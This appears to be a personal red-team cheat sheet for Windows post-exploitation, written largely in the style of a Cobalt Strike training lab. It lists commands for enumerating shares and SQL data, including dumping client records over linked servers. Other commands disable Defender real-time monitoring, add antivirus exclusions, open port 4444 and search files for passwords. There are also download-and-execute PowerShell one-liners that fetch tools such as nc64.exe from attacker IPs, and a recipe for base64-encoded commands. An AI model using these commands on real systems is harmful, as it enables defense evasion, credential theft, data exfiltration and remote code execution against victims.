net ---
creation date: September 22nd 2022
last modified date: September 22nd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[03 - Content/powershell]]  
___

## Description:  

### Find File Shares

`Find-DomainShare` will find SMB shares in a domain and `-CheckShareAccess` will only display those that the executing principal has access to.

```
beacon> powershell Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess

Name     Type Remark              ComputerName      
----     ---- ------              ------------      
data$       0                     dc-1.cyberbotic.io

beacon> ls \\dc-1.cyberbotic.io\data$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 17kb     fil     03/25/2021 12:54:11   63ec08038c04ac60dab340ee9569e690dataMar-25-2021.xlsx
 214kb    fil     03/25/2021 13:02:53   Apple iPhone 8.ai
 1mb      fil     03/25/2021 13:02:55   Boeing 787-8 DreamLiner Air Canada.ai
 540kb    fil     03/25/2021 13:02:54   Caterpillar 345D L.ai
 829kb    fil     03/25/2021 13:02:55   Ducati 1098R (2011).ai
 895kb    fil     03/25/2021 13:02:55   Volkswagen Caddy Maxi (2020).ai
```

### Find Databases
We reviewed multiple methods for executing SQL queries in the **MS SQL Servers** section, but they would not scale well for searching across dozens of instances. PowerUpSQL provides some additional cmdlets designed for data searching and extraction.

One such cmdlet is `Get-SQLColumnSampleDataThreaded`, which can search one or more instances for databases that contain particular keywords in the column names.

```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Instance                     Database Column      Sample         
--------                     -------- ------      ------         
srv-1.dev.cyberbotic.io,1433 master   ProjectName Mild Sun       
srv-1.dev.cyberbotic.io,1433 master   ProjectName Warm Venus     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Grim Lyric     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Precious Castle
srv-1.dev.cyberbotic.io,1433 master   ProjectName Fine Devil
```

This can only search the instances you have direct access to, it won't traverse any SQL links. To search over the links use `Get-SQLQuery`.

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_dev      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          spt_values            VIEW      
master        dbo          spt_monitor           BASE TABLE
master        dbo          MSreplication_options BASE TABLE
master        dbo          VIPClients            BASE TABLE
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"

column_name
-----------
City
Name
OrgNumber
Street
VIPClientsID
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"

OrgNumber  
---------  
65618655299
69838663099
12289506999
73723428599
51766460299
```

### pscp
For moving files

```
C:\> pscp src des
#push
C:\> pscp root@kail:/path/to/file C:\Path\
#pull
C:\> pscp C:\Path\to\file root@kali:/path/
# -r is for folders
```

### Disable defender

^aec913

disable Defender's Real-time protection (This script contains malicious content and has been blocked by your antivirus software.)

`Set-MpPreference -DisableRealtimeMonitoring $true

`Get-MpPreference` can be used to list the current exclusions.  This can be done locally, or remotely using `remote-exec`.

```
beacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*

ExclusionExtension : 
ExclusionIpAddress : 
ExclusionPath : {C:\Shares\software}
ExclusionProcess :
```

If the exclusions are configured via GPO and you can find the corresponding Registry.pol file, you can read them with `Parse-PolFile`.

```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```

In a pinch, you can even add your own exclusions.
```
Set-MpPreference -ExclusionPath "<path>"
```

Or look for ones that already exist
`powershell $(get-MpPreference).ExclusionPath


### Windows error codes

```
C:\>net helpmsg 32
The process cannot access the file because it is being used by another process.
```

### Windows Firewalls rules

This can be done with the built-in `netsh` utility. To add an allow rule:
```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
```

To remove that rule:
```
netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
```


### List of services

```
wmic service list brief
```

### Look for Passwords

```
finstr /si password *.txt 2> nul | more 

Also consider *.xml, *.ini, *.*

findstr /spin “password” *.* 2> nul | more
```

### web requests
```
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8:80/beRoot.py','beRoot.py')"

echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/nc64.exe') | powershell -noprofile -

powershell –c "IEX(New-Object NET.WebClient).downloadString('http://10.10.14.45:1234/required_tool’)”

curl.exe -o tool [http://10.10.14.45:1234/required_tool](http://10.10.14.45:1234/required_tool)

Invoke-WebRequest [http://10.10.14.45:1234/required_tool](http://10.10.14.45:1234/required_tool) -O tool

```

### Powershell Encoding

```
From bash:
echo -n 'COMMAND' | iconv -f UTF8 -t UTF16LE| base64 -w 0
 
powershell -e ‘COMMAND’
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 22nd 2022 (04:11 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
